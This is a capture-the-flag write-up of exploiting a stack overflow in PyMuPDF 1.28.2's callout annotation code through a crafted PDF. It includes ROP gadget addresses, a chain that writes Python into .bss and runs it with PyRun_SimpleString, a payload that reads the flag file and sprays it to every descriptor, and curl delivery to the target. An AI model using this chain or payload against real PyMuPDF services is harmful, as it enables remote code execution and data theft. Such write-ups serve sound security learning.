---
doc_kind: writeup
title: "PDF Strikes Again - PyMuPDF 1.28.2 Callout Stack Overflow to ROP"
category: pwn
slug: pdf-strikes-again-pymupdf-callout-rop
created: 2026-10-10
status: solved
tags:
  - pymupdf
  - stack-overflow
  - rop
  - non-pie
  - python-c-api
  - pdf
  - callout
  - bss-write
source: "Unknown (991 pts)"
target: http://35.253.49.248:5000
---
# PDF Strikes Again - PyMuPDF 1.28.2 Callout Stack Overflow to ROP

## Challenge Summary

- Source: Unknown (991 pts), target `http://35.253.49.248:5000`.
- Goal: read `/flag.txt` (`kBxAc{...}`) from the PDF-processing web app.
- App: Flask upload endpoint -> `process_pdf()` reads the page's custom xref key
  `DocMeta` (a flat list of uint32 bit-patterns), turns pairs into `float32` points,
  then `page.add_freetext_annot(rect, "processed", callout=pts)`.
- Root cause: PyMuPDF **1.28.2** `_extra.so::_wrap_JM_set_annot_callout_line`
  copies `len` `fz_point` (8 bytes each) into a **fixed stack buffer**
  (`movlps %xmm0,(%rsi,%rbx,8)`, base `rsp+0x40`) with **no stack canary**.

## Initial Signals

- Entry point: the `DocMeta` array fully controls the number and content of
  callout points -> attacker-controlled length + bytes written on the stack.
- Dockerfile builds a **non-PIE** `python3.13`
  (`gcc -no-pie ... libpython3.13.a`) => every gadget / C-API function has a
  **fixed address** (ASLR-independent ROP). `/flag.txt` is `444` (world-readable).
- First confirming probe: a `DocMeta` with many points crashes the process
  (exit 139) at the wrapper's `ret`, RIP = non-canonical `0x4242424241414141`.

## Exploit Chain

1. **Recon**: download handout, read `app.py` + `Dockerfile`. Identify the
   `DocMeta` -> `callout=` sink and the non-PIE python build.
2. **Local repro**: install the *same* wheel `pymupdf-1.28.2` in a venv, call
   `page.add_freetext_annot(..., callout=pts)`. Replicate the exact app path.
3. **Locate the overwrite**: disassemble `_wrap_JM_set_annot_callout_line`
   (`_extra.so` `0x154f0`): buffer at `rsp+0x40`, saved return address at
   `rsp+0x88` => **point index 9 controls RIP** (indices 4-8 clobber saved
   rbx/rbp/r12/r13/r14). For `len > 3`, `pdf_set_annot_callout_line`
   (libmupdf `0x28b080`) just deletes the `CL` key and returns cleanly, so the
   hijacked `ret` fires in a clean state.
4. **Build a non-PIE python3.13** from the challenge Dockerfile (`docker build`),
   extract `/opt/python3.13/bin/python3.13` (28 MB, EXEC, not stripped).
   `ROPgadget` -> gadgets; `nm` -> `PyRun_SimpleString`.
5. **Respect the value clamp**: `_extra.so::JM_point_from_py` (`0x12430`) clamps
   each float to `[-2^31, 2^31-1]` before `cvtsd2ss`. Consequence: in every 8-byte
   chain slot the **3rd and 7th bytes** must be `<= 0x4E` or in `0x80..0xCE`
   (so plain ASCII strings can't live directly in the chain). Use only
   3 free bytes per dword => **byte-wise writes**.
6. **Write the payload string into `.bss`**, then call `PyRun_SimpleString`:
   - `pop rdi; ret` `@0x41e9d7`
   - `pop rax; ret` `@0x53a26e`
   - `mov dword ptr [rdi], eax; ret` `@0x46d35c`  (stride-3 byte writes: each
     4-byte store writes 3 free bytes and zeroes the 4th, fixed by the next store)
   - `PyRun_SimpleString` `@0x54b0c0`
   - target buffer = tail of the RW segment just **past `_end` of `.bss`**
     (`BSS=0x91bd00`; RW seg ends `0x91bca0`, page `0x91b000-0x91c000` is mapped
     and zero-filled => safe scratch, avoids corrupting Python globals).
7. **Stack alignment**: entering via `ret` (not `call`), the stack was 8 bytes
   off; Python crashed in `_PyTokenizer_FromString+70` on `movaps %xmm0,(%rsp)`.
   Fix: prepend **one `ret` gadget** (`0x41e9d8`) before the `PyRun` call.
8. **Self-exfil + exit**: the process cannot return to Flask/gunicorn after ROP,
   so the injected Python code reads the flag and writes a raw HTTP response to
   **every fd 0..63** (`os.write` in try/except), then `os._exit(0)`. The client
   socket fd is in that range, so `curl` receives the flag.

## Key Evidence

- gdb on the local repro: SIGSEGV at `_wrap_JM_set_annot_callout_line+0xf4`
  (the `ret`), RIP = attacker bytes => confirmed RIP control, no canary.
- `_PyTokenizer_FromString+70: movaps %xmm0,(%rsp)` SIGSEGV => ROP *did* reach
  `PyRun_SimpleString`; only alignment was wrong.
- With `ALIGN_RETS=1` the harness exited 0 and printed the flag to fd1/fd2;
  end-to-end through the Flask container `curl` returned `kBxAc{TEST_FLAG}`.
- Live target `curl` returned the real flag on the first shot.

## Dead Ends

- Public CVEs for PyMuPDF (1.26.5 path traversal, `extract_objects` traversal)
  were not on the app's code path — ignore; the bug was the local callout copy.
- The "HTML global / template output" trick cannot work: the worker dies during
  ROP, before gunicorn renders the response => must exfil from inside the ROP.
- Reverse shell to the Kali LAN IP is unreliable (target is cloud, Kali is
  private) => prefer the fd-blast (works without any egress).

## Payloads And Commands

```python
# gen_exploit.py (host pymupdf to write the malicious PDF)
POP_RDI=0x41e9d7; POP_RAX=0x53a26e
MOV_DWORD=[rdi],eax=0x46d35c; PYRUN=0x54b0c0; BSS=0x91bd00; RET=0x41e9d8
CMD = r"""import os
d=open('/flag.txt','rb').read()
r=b'HTTP/1.0 200 OK\r\n\r\n'+d
for f in range(64):
 try:os.write(f,r)
 except:pass
os._exit(0)
"""
# slots = [0]*9 + chain ; point i -> x=slot&0xffffffff, y=slot>>32
# write cmd into BSS 3 bytes at a time, then 1 RET (align) + POP_RDI;BSS;PYRUN
```

```bash
# build the target's python and grab gadgets
docker build -t docuflow .            # challenge Dockerfile (builds non-PIE py3.13)
docker create --name e docuflow && docker cp e:/opt/python3.13/bin/python3.13 .
ROPgadget --binary python3.13 > gadgets.txt
nm python3.13 | grep ' T PyRun_SimpleString'
# deliver
curl -s -m 20 -F "pdf=@exploit.pdf;filename=x.pdf" http://35.253.49.248:5000/
```

## Flag / Outcome

- `kBxAc{___y37_4n07h3r_pdf_p4r51ng_vuln3r4bl17y_7h47_g1v35_5h3ll_4nd_fl4g!!!___}`
- Local container test flag: `kBxAc{TEST_FLAG}`.

## Reusable Lessons

- A wheels-shipped native lib (`_extra.so`) can lack a canary even when the app
  Python is built `-fstack-protector-strong`; the overflow lives in the C
  extension, not CPython.
- The `log_2(2^31)` clamp of float->bit conversions constrains the *top byte of
  every dword*; plan byte-wise writes into a known writable region.
- Past `.bss` end but inside the mapped RW page = free scratch that avoids
  corrupting interpreter globals.
- `PyRun_SimpleString` is the ideal post-ROP payload loader in a non-PIE CPython.
- When you hijack via `ret`, stack alignment is usually off by 8 => add one `ret`
  gadget (classic `movaps` crash signature).
- If the process will die, self-exfil inside the payload; fd-blast (0..63) beats
  a reverse shell when the attacker has no routable address.

## Pattern Candidates

- New pattern: `../patterns/pwn/pymupdf-callout-overflow-pyrun-rop.md`
